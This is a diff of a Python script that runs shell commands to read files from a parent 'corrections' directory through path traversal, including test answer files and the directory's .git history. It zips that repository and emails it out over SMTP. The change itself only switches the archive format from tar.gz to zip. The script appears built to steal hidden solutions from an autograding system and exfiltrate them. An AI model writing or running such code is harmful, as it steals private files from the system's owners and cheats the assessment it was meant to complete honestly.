@@ -47,7 +47,7 @@ my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/test0") 
 my_data += get_data("pwd") or ""
 my_data += get_data("ls -l ../../../../corrections_*/.git")
 my_data += "\n#######################\n"
-my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/.git/!(index)")
+my_data += get_data("zip -r file.zip ../../../../corrections_*/.git -x '*index*'")
 my_data += get_data("ls -l")
 send_data(my_data)
 ##############################################################
@@ -73,7 +73,7 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Attach the zip file
     with open(zip_filename, 'rb') as attachment:
-        part = MIMEBase('application', 'gz')
+        part = MIMEBase('application', 'zip')
         part.set_payload(attachment.read())
         encoders.encode_base64(part)
         part.add_header('Content-Disposition', f'attachment; filename= {zip_filename}')
@@ -91,4 +91,4 @@ def send_data_file(zip_filename="data.zip", message="no_data"):
     
     # Terminating the session
     s.quit()
-send_data_file("file.tar.gz", "mygit")
+send_data_file("file.zip", "mygit")
